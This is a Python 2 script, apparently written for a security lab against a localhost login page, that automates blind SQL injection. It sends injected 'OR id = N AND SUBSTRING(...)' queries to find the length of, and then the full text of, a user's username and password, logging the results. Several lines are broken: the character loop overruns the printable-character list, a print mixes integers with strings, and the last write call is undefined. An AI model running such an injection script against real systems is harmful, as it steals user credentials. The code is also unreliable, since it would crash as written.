import subprocess
import urllib
import string
import datetime
from itertools import cycle


# request = "http://localhost/lab09/login.php?u=\" OR id = 98 AND SUBSTRING(password,1,1) = '1' -- " 
# request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20" 
# request = "http://localhost/lab09/login.php?u=\"%20OR%201%20--%20 " 
#bashCommand = "echo 'hello' "
# subprocess.call(['wget','-q','-O','index.html',request])
#output, error = process.communicate()
#print output
#print error
#print bashCommand

file= open("logs.txt","w+")
file.write('START : ' + str(datetime.datetime.now())+'\n')
listASCII=string.printable
iterator=cycle(['username','password'])
for row in xrange(46,47):
#for row in xrange(1,101):
	file.write(str(row) + "    ")
	for iter in xrange(0,2):
		field=iterator.next()
		size = 0;
		while size<= 100:

			request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20" + str(row) + "%20AND%20length(" + str(field) + ")%20=%20" + str(size) + "--%20"
			f = urllib.urlopen(request)
			response = f.read()
			if (response.find('cat.JPG')!=-1): 
				# print "found size : %s" %s				
				break
			size+=1
				
		word=""
		for pos in xrange(1,size+1):

			for c in xrange(0,128):
				request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20"+ str(row) +"%20AND%20SUBSTRING(" + str(field) + ","+ str(pos) +",1)%20=%20%27" + listASCII[c] + "%27%20--%20" 
				f = urllib.urlopen(request)
				response = f.read()
				if (response.find('cat.JPG')!=-1): 
					# print "found letter %s at position %d" %(listASCII[c],pos)
					word += listASCII[c]
					break
			print pos + c + listASCII[c]		
		file.write(word)
		file.write("     ")
		
	file.write("\n")
write('END : ' + str(datetime.datetime.now())+'\n')	
file.close()		

			



	# f = urllib.urlopen(request)
	# print "1" + f.geturl()
	# print "2" + f.read()